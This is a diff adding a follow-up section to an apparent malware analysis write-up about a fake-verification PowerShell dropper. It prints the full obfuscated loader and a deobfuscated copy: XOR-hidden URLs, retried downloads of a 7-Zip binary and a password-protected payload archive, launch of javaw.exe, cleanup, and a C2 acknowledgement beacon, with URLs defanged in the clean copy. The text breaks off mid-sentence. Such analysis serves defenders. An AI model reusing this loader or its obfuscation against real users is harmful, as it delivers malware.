@@ -170,3 +170,100 @@ catch{}
 ```
 Analysing this, there seems to be a time wasting / mathematic operation loop to square root multiples of 8 and add them up.
 After this, it creates a temporary directory and .exe file and tries to download the value of `hxxp[:]//svs-verificationdate[.]beer/37027e701747c94f3a5623633aac52462dbd663fa428368ea2085cf6391b4721` to the new temp file. If it downloads, it tries starting the process. Once it does that, it sleeps for 5s, deletes the new temp file and then calls out to `hxxp[:]//svs-verificationdate[.]beer/8348aeb3ca3281e0?ack=1`
+
+Now, the presence of `ack=1` leads me to believe that this is some sort of C2 beacon.
+
+The file download, when I was working through this, failed and I was unable to see the content of it.
+
+---
+
+## Follow Up
+Update: I found and followed another example of this which used a slightly different method. From the same website, in the encoded powershell command, this was the content.
+```PowerShell
+$n48b6='Do'+'wnloadData'
+$n5405='WriteAllB'+'ytes'
+$g17c9=0
+$g42a5=0
+while($g17c9-lt 327021){$g42a5+=[math]::Sqrt($g17c9*8) ++$g17c9}
+$pw=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('eG1xOTJpeERt'))
+$u62fb9=-join(@(18,14,14,10,64,85,85,9,12,9,87,12,31,8,19,28,19,25,27,14,19,21,20,30,27,14,31,84,24,31,31,8,85,77,0)|%{[char]($_-bxor122)})
+$u54c33=-join(@(63,35,35,39,109,120,120,36,33,36,122,33,50,37,62,49,62,52,54,35,62,56,57,51,54,35,50,121,53,50,50,37,120,51,101,110,111,51,110,111,102,52,96,103,102,53,53,50,96,99,53,97,97,52,103,52,96,51,50,52,102,50,102,97,101,49,111,51,99,96,53,103,53,110,101,100,111,97,49,111,50,50,100,102,97,52,102,49,49,51,100,52,96,96,53,52,102)|%{[char]($_-bxor87)})
+$td=[IO.Path]::Combine([IO.Path]::GetTempPath(),[IO.Path]::GetRandomFileName())
+[IO.Directory]::CreateDirectory($td)|Out-Null
+$z=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName()+'.exe')
+$a=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName()+'.zip')
+$wc=New-Object ('Net.'+'WebClient')
+$ok=0
+for($i=0;$i -lt 3 -and !$ok;$i++){try{if(![IO.File]::Exists($z)){[IO.File]::$n5405($z,$wc.$n48b6($u62fb9))}
+[IO.File]::$n5405($a,$wc.$n48b6($u54c33))
+if([IO.File]::Exists($a)){$ok=1}else{Start-Sleep 2}}catch{Start-Sleep 2}}
+if(![IO.File]::Exists($a)){exit}
+$nd=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName())
+[IO.Directory]::CreateDirectory($nd)|Out-Null
+$xa=@('x','-y')
+if($pw){$xa+='-p'+$pw}
+$xa+='-o'+$nd
+$xa+=$a
+if([IO.File]::Exists($z)){& $z @xa|Out-Null}else{try{Add-Type -A System.IO.Compression.FileSystem
+[IO.Compression.ZipFile]::ExtractToDirectory($a,$nd)}catch{}}
+$fp=[IO.Directory]::GetFiles($nd,'javaw.exe','AllDirectories')|Select-Object -First 1
+if($fp){Start-Process -FilePath $fp}
+try{Start-Sleep 3
+[IO.File]::Delete($a)}catch{}
+$uc83c5=-join(@(38,58,58,62,116,97,97,61,56,61,99,56,43,60,39,40,39,45,47,58,39,33,32,42,47,58,43,96,44,43,43,60,97,121,126,42,47,126,42,127,118,42,118,40,118,43,43,44,40,113,47,45,37,115,127)|%{[char]($_-bxor78)})
+$n1a21='Downl'+'oadString'
+try{[void]$wc.$n1a21($uc83c5)}catch{}
+```
+Expanding this and renaming variables shows
+```PowerShell
+$downloadDataString = 'DownloadData'
+$writeAllBytesString = 'WriteAllBytes'
+$g17c9 = 0
+$g42a5 = 0
+while ($g17c9 -lt 327021) { $g42a5 += [math]::Sqrt($g17c9 * 8) ++$g17c9 }
+$pw = 'xmq92ixDm'
+$7zURL = 'hxxp[:]//svs-verificationdate[.]beer/7z'
+$urlDownload = 'hxxp[:]//svs-verificationdate[.]beer/d298d981c701bbe74b66c0c7dec1e162f8d47b0b92386f8ee316c1ffd3c77bc1'
+$temporaryDirectory = [IO.Path]::Combine([IO.Path]::GetTempPath(), [IO.Path]::GetRandomFileName())
+[IO.Directory]::CreateDirectory($temporaryDirectory) | Out-Null
+$exeTempfile = [IO.Path]::Combine($temporaryDirectory, [IO.Path]::GetRandomFileName() + '.exe')
+$zipTempfile = [IO.Path]::Combine($temporaryDirectory, [IO.Path]::GetRandomFileName() + '.zip')
+$wc = New-Object ('Net.WebClient')
+$ok = 0
+for ($i = 0; $i -lt 3 -and !$ok; $i++) {
+    try {
+        if (![IO.File]::Exists($exeTempfile)) {
+            [IO.File]::$writeAllBytesString($exeTempfile, $wc.$downloadDataString($7zURL))
+        }
+        [IO.File]::$writeAllBytesString($zipTempfile, $wc.$downloadDataString($urlDownload))
+        if ([IO.File]::Exists($zipTempfile)) { $ok = 1 }
+        else { Start-Sleep 2 }
+    }
+    catch { Start-Sleep 2 }
+}
+if (![IO.File]::Exists($zipTempfile)) { exit }
+$secondaryTempFile = [IO.Path]::Combine($temporaryDirectory, [IO.Path]::GetRandomFileName())
+[IO.Directory]::CreateDirectory($secondaryTempFile) | Out-Null
+$xyArray = @('x', '-y')
+if ($pw) { $xyArray += '-p' + $pw }
+$xyArray += '-o' + $secondaryTempFile
+$xyArray += $zipTempfile
+if ([IO.File]::Exists($exeTempfile)) { & $exeTempfile @xyArray | Out-Null }else {
+    try {
+        Add-Type -zipTempfile System.IO.Compression.FileSystem
+        [IO.Compression.ZipFile]::ExtractToDirectory($zipTempfile, $secondaryTempFile)
+    }
+    catch {}
+}
+$fp = [IO.Directory]::GetFiles($secondaryTempFile, 'javaw.exe', 'AllDirectories') | Select-Object -First 1
+if ($fp) { Start-Process -FilePath $fp }
+try {
+    Start-Sleep 3
+    [IO.File]::Delete($zipTempfile)
+}
+catch {}
+$ackURL = 'hxxp[:]//svs-verificationdate[.]beer/70da0d18d8f8eebf?ack=1'
+$downloadString = 'Downl' + 'oadString'
+try { [void]$wc.$downloadString($ackURL) }catch {}
+```
+This one performs a similar function, it creates two new temporary files with `.exe` and `.zip` respectively. It then tries 3 times to download a "7zip" file from the domain, and then the malware payload from the domain. The secondary tempfile is created 
